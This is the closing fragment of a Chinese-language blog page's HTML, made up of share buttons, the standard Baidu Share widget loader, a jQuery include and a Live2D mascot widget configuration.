    <a class="article-share-renren" data-cmd="renren" title="分享到人人网"></a>
    <a class="article-share-more" data-cmd="more" title="更多"></a>
  </div>
</div>
<script>
  function SetShareData(cmd, config) {
    if (shareDataTitle && shareDataUrl) {
      config.bdText = shareDataTitle;
      config.bdUrl = shareDataUrl;
    }
    return config;
  }
  window._bd_share_config={
    "common":{onBeforeClick: SetShareData},
    "share":{"bdCustomStyle":"/css/bdshare.css"}
  };
  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
</script>

<!-- 百度分享 end -->

<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>





<script src="/js/script.js"></script>


</div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":200,"height":300},"mobile":{"show":false},"log":false});</script></body>
</html>
